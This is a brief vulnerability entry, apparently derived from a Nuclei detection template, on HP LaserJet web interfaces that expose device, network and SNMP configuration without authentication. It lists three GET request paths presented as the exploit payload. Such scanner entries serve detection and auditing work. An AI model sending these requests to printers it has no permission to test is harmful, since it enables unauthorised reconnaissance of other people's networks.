# Vulnerability: HP LaserJet Configuration Exposure
**Classification:** CWE-200
**Source:** Nuclei Template (`hp-laserjet-config.yaml`)

## Description
HP LaserJet printer web interface exposes sensitive configuration information without authentication.This includes device information, network configuration, SNMP settings, and other sensitive data that could be leveraged for further attacks or network reconnaissance.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/hp/device/this.LCDispatcher?nav=hp.Config
GET {{BaseURL}}/info_configuration.html?tab=Home&menu=DevConfig
GET {{BaseURL}}/SSI/info_configuration.htm
```

